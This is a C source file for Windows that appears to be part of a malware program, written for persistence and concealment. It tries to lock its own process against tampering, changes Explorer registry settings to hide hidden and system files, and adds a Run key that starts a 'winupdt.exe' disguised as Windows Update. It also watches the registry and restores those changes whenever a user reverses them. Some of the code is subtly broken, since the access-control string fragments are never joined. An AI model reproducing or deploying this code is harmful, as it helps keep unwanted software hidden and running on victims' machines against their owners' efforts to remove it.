#include <windows.h>
#include <aclapi.h>
#include <sddl.h>
#include <tchar.h>

_Bool SelfDefense()
{
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
	SECURITY_ATTRIBUTES sa;
	TCHAR * szSD = TEXT("D:P");
	TEXT("(D;OICI;GA;;;BG)");
	TEXT("(D;OICI;GA;;;AN)");

	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = FALSE;
	if (!ConvertStringSecurityDescriptorToSecurityDescriptor(szSD, SDDL_REVISION_1, &(sa.lpSecurityDescriptor), NULL))
		return FALSE;
	if (!SetKernelObjectSecurity(hProcess, DACL_SECURITY_INFORMATION, sa.lpSecurityDescriptor))
		return FALSE;
	return TRUE;
}

void hideFiles() {
	HKEY newValue;
	
	RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", &newValue);
	int n = 2;
	char* a = (char*)&n;
	RegSetValueEx(newValue, "Hidden", 0, REG_DWORD, a, sizeof(a));
	RegCloseKey(newValue);

	RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", &newValue);
	n = 0;
	a = (char*)&n;
	RegSetValueEx(newValue, "ShowSuperHidden", 0, REG_DWORD, a, sizeof(a));
	RegCloseKey(newValue);
}

void fixStartup() {
	system("REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V Windows_Update /t REG_SZ /F /D %APPDATA%\\Windows_Update\\winupdt.exe");
}

void WatchReg(char *watch, _Bool watchType)
{
	DWORD  dwFilter = 	REG_NOTIFY_CHANGE_NAME 			|
	                	REG_NOTIFY_CHANGE_ATTRIBUTES 	|
	                 	REG_NOTIFY_CHANGE_LAST_SET 		|
	                 	REG_NOTIFY_CHANGE_SECURITY; 

	HANDLE hEvent;
	HKEY   hMainKey;
	HKEY   hKey;
	LONG   lErrorCode;

	hMainKey = HKEY_CURRENT_USER;

	lErrorCode = RegOpenKeyEx(hMainKey, watch, 0, KEY_NOTIFY, &hKey);
	if (lErrorCode != ERROR_SUCCESS)
	{
		_tprintf(TEXT("Error in RegOpenKeyEx (%d).\n"), lErrorCode);
	  	return;
	}

	hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
	if (hEvent == NULL)
	{
		_tprintf(TEXT("Error in CreateEvent (%d).\n"), GetLastError());
		return;
	}

	lErrorCode = RegNotifyChangeKeyValue(hKey, TRUE, dwFilter, hEvent, TRUE);
	if (lErrorCode != ERROR_SUCCESS)
	{
		_tprintf(TEXT("Error in RegNotifyChangeKeyValue (%d).\n"), lErrorCode);
		return;
	}

	while(1 > 0) {
		if (WaitForSingleObject(hEvent, INFINITE) == WAIT_FAILED)
		{
			_tprintf(TEXT("Error in WaitForSingleObject (%d).\n"), GetLastError());
			return;
		} 
		else 
		{
			if (watchType)
				hideFiles();
			else
				fixStartup();

			WatchReg(watch, watchType);
		}
	}

	lErrorCode = RegCloseKey(hKey);
	if (lErrorCode != ERROR_SUCCESS)
	{
		_tprintf(TEXT("Error in RegCloseKey (%d).\n"), GetLastError());
		return;
	}

	if (!CloseHandle(hEvent))
	{
		_tprintf(TEXT("Error in CloseHandle.\n"));
		return;
	}
}